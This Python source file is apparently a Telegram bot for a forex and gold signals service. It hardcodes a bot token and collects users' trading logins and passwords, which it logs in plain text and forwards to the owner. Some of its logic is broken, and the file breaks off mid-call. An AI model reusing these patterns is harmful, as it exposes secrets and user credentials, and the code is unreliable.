import requests
import sqlite3
import time
import threading
import re
import sys
import random

# =====================================================================
# ⚙️ CONFIGURATION 
# =====================================================================
API_TOKEN = "8851943854:AAGfy9xw9srlQCE5g_yH0hMYqjPsI5NC-e4"  # ⚠️ Apne bot ka real Telegram Token yahan dalein
OWNER_ID = 7415265825  # 👑 Prince Bhai Admin ID Locked

FREE_GROUP_ID = -4477244119  # Gold Expert Fx Community
PRIVATE_CHANNEL_ID = -3870933647  # Gold Expert FX | XAUUSD Signals
# =====================================================================

if not API_TOKEN:
    print("❌ ERROR: API_TOKEN khali hai!")
    sys.exit(1)

BASE_URL = f"https://api.telegram.org/bot{API_TOKEN}"
EMOJI_POOL = ["🔥", "🚀", "👍", "❤️", "⚡", "🎉", "🤩"]

def init_db():
    conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS member_activity (user_id INTEGER PRIMARY KEY, leave_timestamp REAL)")
    cursor.execute("CREATE TABLE IF NOT EXISTS pending_channel_requests (user_id INTEGER, chat_id INTEGER, request_time REAL, PRIMARY KEY (user_id, chat_id))")
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users_profile (
            user_id INTEGER PRIMARY KEY,
            first_name TEXT,
            username TEXT,
            join_date REAL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action_type TEXT,
            details TEXT,
            timestamp REAL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admin_state (
            admin_id INTEGER PRIMARY KEY,
            target_user_id INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS dynamic_content (
            service_key TEXT PRIMARY KEY,
            text_content TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admin_edit_state (
            admin_id INTEGER PRIMARY KEY,
            editing_service TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_content(service_key, default_text):
    try:
        conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
        cursor = conn.cursor()
        cursor.execute("SELECT text_content FROM dynamic_content WHERE service_key = ?", (service_key,))
        row = cursor.fetchone()
        conn.close()
        if row and row[0]:
            return row[0]
    except Exception: pass
    return default_text

def set_content(service_key, new_text):
    try:
        conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO dynamic_content VALUES (?, ?)", (service_key, new_text))
        conn.commit()
        conn.close()
        return True
    except Exception:
        return False

def log_user_history(user_id, action_type, details):
    try:
        conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO user_history (user_id, action_type, details, timestamp) VALUES (?, ?, ?, ?)",
                       (user_id, action_type, details, time.time()))
        conn.commit()
        conn.close()
    except Exception: pass

def get_main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "💼 Account Management Services", "callback_data": "srv_account"}],
            [{"text": "👑 VIP Premium Private Channel", "callback_data": "srv_vip"}],
            [{"text": "📋 Copy Trading Service", "callback_data": "srv_copy"}]
        ]
    }

def get_owner_menu():
    return {
        "keyboard": [
            [{"text": "👥 View All Users (Admin Panel)"}],
            [{"text": "✏️ Edit Bot Messages"}]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def handle_incoming_message(msg):
    chat_id = msg.get("chat", {}).get("id")
    message_id = msg.get("message_id")
    text = msg.get("text", "")
    from_user = msg.get("from", {})
    from_user_id = from_user.get("id")
    chat_type = msg.get("chat", {}).get("type")
    
    if "new_chat_members" in msg or "left_chat_member" in msg:
        requests.post(f"{BASE_URL}/deleteMessage", json={"chat_id": chat_id, "message_id": message_id})
        if chat_id == FREE_GROUP_ID and "left_chat_member" in msg:
            left_user_id = msg["left_chat_member"]["id"]
            try:
                conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
                cursor = conn.cursor()
                cursor.execute("INSERT OR REPLACE INTO member_activity VALUES (?, ?)", (left_user_id, time.time()))
                conn.commit()
                conn.close()
            except Exception: pass
        return

    if chat_type == "private":
        try:
            conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
            cursor = conn.cursor()
            cursor.execute("INSERT OR IGNORE INTO users_profile VALUES (?, ?, ?, ?)", 
                           (from_user_id, from_user.get("first_name"), from_user.get("username"), time.time()))
            conn.commit()
            conn.close()
        except Exception: pass

        if from_user_id == OWNER_ID:
            if text == "👥 View All Users (Admin Panel)":
                conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
                cursor = conn.cursor()
                cursor.execute("SELECT user_id, first_name, username FROM users_profile ORDER BY join_date DESC LIMIT 30")
                rows = cursor.fetchall()
                conn.close()
                
                if not rows:
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "📭 No logged users found yet."})
                    return
                    
                kb = {"inline_keyboard": []}
                for u_id, f_name, u_name in rows:
                    disp = f"{f_name} (@{u_name})" if u_name else f"{f_name}"
                    kb["inline_keyboard"].append([{"text": f"👤 {disp}", "callback_data": f"adm_view_{u_id}"}])
                
                requests.post(f"{BASE_URL}/sendMessage", json={
                    "chat_id": OWNER_ID, "text": "👥 **Select a user to view full log details & history chat box:**", "parse_mode": "Markdown", "reply_markup": kb
                })
                return

            elif text == "✏️ Edit Bot Messages":
                kb = {
                    "inline_keyboard": [
                        [{"text": "📝 Edit Account Management Rules", "callback_data": "edt_account"}],
                        [{"text": "📝 Edit VIP Group Content", "callback_data": "edt_vip"}],
                        [{"text": "📝 Edit Copy Trading Rules", "callback_data": "edt_copy"}],
                        [{"text": "❌ Cancel Editing", "callback_data": "edt_cancel"}]
                    ]
                }
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "🛠️ **Which service text content do you want to modify, Prince Bhai?**\n\nSelect an option below, then paste the new text completely.", "parse_mode": "Markdown", "reply_markup": kb})
                return

        if from_user_id == OWNER_ID and text and not text.startswith("/"):
            conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
            cursor = conn.cursor()
            cursor.execute("SELECT editing_service FROM admin_edit_state WHERE admin_id = ?", (OWNER_ID,))
            edit_row = cursor.fetchone()
            conn.close()

            if edit_row and edit_row[0]:
                service_key = edit_row[0]
                if set_content(service_key, text):
                    conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
                    cursor = conn.cursor()
                    cursor.execute("DELETE FROM admin_edit_state WHERE admin_id = ?", (OWNER_ID,))
                    conn.commit()
                    conn.close()
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"✅ **Success!** Content for `{service_key}` has been live-updated in the database.", "parse_mode": "Markdown"})
                else:
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "❌ Database error while updating text."})
                return

        if from_user_id == OWNER_ID and text and not text.startswith("/"):
            conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
            cursor = conn.cursor()
            cursor.execute("SELECT target_user_id FROM admin_state WHERE admin_id = ?", (OWNER_ID,))
            row = cursor.fetchone()
            conn.close()
            
            if row:
                target_id = row[0]
                payload = {"chat_id": target_id, "text": f"💬 **Message from Admin:**\n\n{text}", "parse_mode": "Markdown"}
                res = requests.post(f"{BASE_URL}/sendMessage", json={
                    "chat_id": OWNER_ID, 
                    "text": "⏳ **Format Received Successfully!**\n\nPlease wait while our team reviews your trading details and initializes your connection. We will notify you here directly.",
                    "parse_mode": "Markdown"
                })
                return

        if text and text.startswith("/start"):
            log_user_history(from_user_id, "COMMAND", "/start executed")
            name = from_user.get("first_name", "Trader")
            uname = f"@{from_user.get('username')}" if from_user.get('username') else "No Username"
            
            welcome = (
                f"👋 **Hello, {name}!**\n"
                f"🌐 **Username:** {uname}\n"
                f"🆔 **Your Telegram ID:** `{from_user_id}`\n\n"
                "Welcome to **Gold Expert FX Automation Hub**. Please select any service from the interactive buttons below to view terms or apply:"
            )
            
            payload = {
                "chat_id": chat_id, "text": welcome, "parse_mode": "Markdown", "reply_markup": get_main_keyboard()
            }
            if from_user_id == OWNER_ID:
                payload["reply_markup"] = get_owner_menu()
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": f"👑 Welcome Back Prince Bhai. Admin menu activated below.", "reply_markup": get_owner_menu()})
            
            requests.post(f"{BASE_URL}/sendMessage", json={
                "chat_id": OWNER_ID, 
                "text": "⏳ **Format Received Successfully!**\n\nPlease wait while our team reviews your trading details and initializes your connection. We will notify you here directly.",
                "parse_mode": "Markdown"
            })
            return

        if text and from_user_id != OWNER_ID:
            log_user_history(from_user_id, "USER_MESSAGE", text)
            
            if "Broker name" in text or "Login ID" in text or "Password" in text:
                requests.post(f"{BASE_URL}/sendMessage", json={
                    "chat_id": chat_id, 
                    "text": "⏳ **Format Received Successfully!**\n\nPlease wait while our team reviews your trading details and initializes your connection. We will notify you here directly.",
                    "parse_mode": "Markdown"
                })
            
            admin_alert = (
                f"📥 **New User Interaction Message!**\n\n"
                f"👤 **From:** {from_user.get('first_name')} | ID: `{from_user_id}`\n"
                f"💬 **Content:** {text}\n\n"
                f"👉 Use the Admin Panel below to click and reply directly."
            )
            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": admin_alert, "parse_mode": "Markdown"})

    if chat_id == FREE_GROUP_ID and from_user_id == OWNER_ID:
        threading.Thread(target=lambda: requests.post(f"{BASE_URL}/setMessageReaction", json={
            "chat_id": chat_id, "message_id": message_id, 
            "reaction": [{"type": "emoji", "emoji": random.choice(EMOJI_POOL)}]}
        ), daemon=True).start()

    if text and chat_id == FREE_GROUP_ID:
        url_pattern = r'(https?://[^\s]+|www\.[^\s]+|\bt\.me/[^\s]+|[a-zA-r0-9\-\.]+\.(com|net|org))'
        if re.search(url_pattern, text, re.IGNORECASE):
            if not (msg.get("forward_from_chat", {}).get("id") == PRIVATE_CHANNEL_ID or from_user_id == OWNER_ID):
                requests.post(f"{BASE_URL}/deleteMessage", json={"chat_id": chat_id, "message_id": message_id})

def handle_callback_query(callback):
    c_id = callback["id"]
    from_user = callback["from"]
    from_user_id = from_user["id"]
    chat_id = callback["message"]["chat"]["id"]
    message_id = callback["message"]["message_id"]
    data = callback["data"]
    
    requests.post(f"{BASE_URL}/answerCallbackQuery", json={"callback_query_id": c_id})
    
    def_account_text = """Account Management Service – Terms & Rules

Please read the following terms carefully before joining our Account Management Service.

1. Trading Account
You will provide your MT4 or MT5 login details so we can manage your trading account professionally.

2. Fund Security
Your funds always remain in your own trading account. We cannot deposit, withdraw, or transfer your money. Only you have full control over your funds.

3. Profit Sharing
All trading profits will be shared 50% for you and 50% for us.

4. Loss Sharing
If a trading loss occurs, the loss will also be shared 50/50. Since we receive 50% of the profit, we also accept 50% of the trading loss.

5. Profit Payment
After profit is generated, we will notify you. You can then send our 50% profit share using any of the payment methods listed below.

6. No Scam
This is a transparent and honest service. There are no hidden charges, no scams, and no fake promises.

7. No Long-Term Commitment
You are free to start or stop the service at any time. There is no pressure or obligation to continue working with us.

Accepted Brokers
✅ All Brokers Accepted

Accepted Payment Methods
- Binance
- USDT
- Skrill
- Neteller
- Bitcoin (BTC)
- Ethereum (ETH)
- Perfect Money
- WebMoney

Thank you for choosing our Account Management Service. We look forward to building a successful and long-term partnership with you."""
    
    def_vip_text = """Join Our VIP Premium Group

If you ever miss our free signals or want more trading opportunities with higher consistency, you can join our VIP Premium Group.

What You Get:
- ✅ 5–7 XAUUSD signals daily
- ✅ High-accuracy trade setups
- ✅ Point-by-point trade updates
- ✅ Entry, Take Profit & Stop Loss levels
- ✅ Market analysis & chart analysis
- ✅ Trading rules and risk management guidance
- ✅ Learning and educational support

If, after joining, you feel the VIP Premium Group does not provide the services described above, you may contact our support team to request cancellation. In that case, we will deduct 30% as a service fee and refund the remaining 70% of your payment, subject to our refund policy.

VIP Membership Packages
- 💎 Lifetime Access: $700 (One-Time Payment)
- 📅 1 Year: $500
- 📆 1 Month: $300
- 📈 1 Week: $100

«Note: All packages include the same VIP features. The only difference is the membership duration.»

You can judge our trading accuracy by following our Free Signals Channel/Group before upgrading.

If you need more information or have any questions, feel free to contact us. Our support team will be happy to assist you."""
    
    def_copy_text = """📋 Copy Trading Terms & Conditions

Gold Expert FX | Copy Trading Rules

1. Account Requirement
- Client ke paas MT4 ya MT5 trading account hona chahiye.
- Account kisi supported broker par hona chahiye.

2. Copy Trading Setup
- Client apna Investor Password ya Copy Trading connection details provide karega.
- Account ki ownership hamesha client ke paas rahegi.

3. Minimum Deposit
- Recommended minimum deposit: $200 ya us se zyada.

4. Risk Warning
- Forex aur Gold trading high-risk business hai.
- Profit guaranteed nahi hota.
- Market ki volatility ki wajah se loss bhi ho sakta.

5. Profit & Loss
- Account ka sara profit aur loss client ke account mein hi hoga.
- Gold Expert FX market conditions ke mutabiq trades provide karega.

6. No Deposit Withdrawal
- Hum kabhi bhi client ke account se funds withdraw nahi kar sakte.
- Funds par sirf account owner ka control hota hai.

7. VPS & Internet
- Copy Trading ko smoothly chalane ke liye stable internet ya VPS use karna recommended hai.

8. Account Changes
- Client bina inform kiye leverage, password, ya account settings change na kare.
- Agar changes kiye gaye to service temporarily stop ki ja sakti hai.

9. Responsibility
- Client apne account aur broker ki policies ka khud zimmedar hoga.
- Broker ki kisi technical problem ya slippage ke liye Gold Expert FX responsible nahi hoga.

10. Trading Results
- Past performance future profit ki guarantee nahi hoti.
- Har trade mein risk hota hai.

11. Service Cancellation
- Gold Expert FX kisi bhi waqt rules violation ya misuse ki surat mein Copy Trading service terminate kar sakta hai.

12. Agreement
- Copy Trading service join karte hi client in tamam Terms & Conditions ko accept karta hai.

Copy Trading Service

If you don't have enough time to analyze the market or place trades manually, you can join our Copy Trading Service.

Our Copy Trading Service allows our trades to be copied automatically to your trading account. Simply complete the setup once, and your account will receive our trades automatically. You don't need to monitor the market or trade manually.

What You Get
- ✅ Automatic trade copying
- ✅ Professional trade management
- ✅ No daily market analysis required
- ✅ Save your valuable time
- ✅ One-time setup
- ✅ No monthly subscription
- ✅ No hidden charges
- ✅ One-time payment only

Supported Brokers
We support all MT4 and MT5 brokers.

After your payment has been successfully confirmed, we will provide you with all the required Copy Trading details and guide you through the complete setup process.

Copy Trading Fee
💰 One-Time Payment: $1,000

There are no monthly fees, no profit-sharing, and no hidden commissions. After paying the one-time fee, you can use our Copy Trading Service without any additional service charges.

Risk & Refund Policy
We use professional risk management and always try to protect our clients' accounts. However, trading in financial markets always involves risk, and no one can guarantee that losses will never occur or that profits are guaranteed.

If you decide to cancel the Copy Trading Service, you may contact our support team.

According to our refund policy:
- We will deduct 30% as a service and administration fee.
- The remaining 70% of your one-time payment will be refunded to you.

Contact Us
If you have any questions or need more information, feel free to contact our support team. We will be happy to assist you with the registration and setup process."""

    if data.startswith("edt_") and from_user_id == OWNER_ID:
        action = data.split("_")[1]
        if action == "cancel":
            conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM admin_edit_state WHERE admin_id = ?", (OWNER_ID,))
            conn.commit()
            conn.close()
            requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": "❌ Editing process cancelled smoothly."})
            return
        
        conn = sqlite3.connect("new_join_filter_bot.db", timeout=20)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO admin_edit_state VALUES (?, ?)", (OWNER_ID, action))
        conn.commit()
        conn.close()
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id"
